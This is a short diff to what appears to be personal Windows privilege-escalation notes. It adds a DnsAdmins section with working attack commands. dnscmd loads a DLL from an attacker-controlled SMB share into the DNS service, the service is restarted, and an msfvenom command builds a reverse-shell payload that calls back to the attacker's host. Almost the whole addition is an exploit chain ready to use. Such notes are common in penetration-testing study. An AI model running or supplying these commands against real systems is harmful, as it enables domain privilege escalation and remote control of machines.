@@ -91,3 +91,19 @@ C:\Windows\Repair\SYSTEM
 ------HIDDELFILES------
 
 ls -force # in powershell
+
+------DNSADMINGORUP------
+
+how to check? 
+
+whoami /all # we have DnsAdmins group
+
+exploit
+
+start smb server on kali and execute the command below
+dnscmd.exe /config /serverlevelplugindll \\ip\share\plugin.dll
+net stop dns || sc.exe stop dns
+net start dns || sc.exe start dns
+
+if stuck! payload was generated with
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=port --platform=windows -f dll > plugin.dll
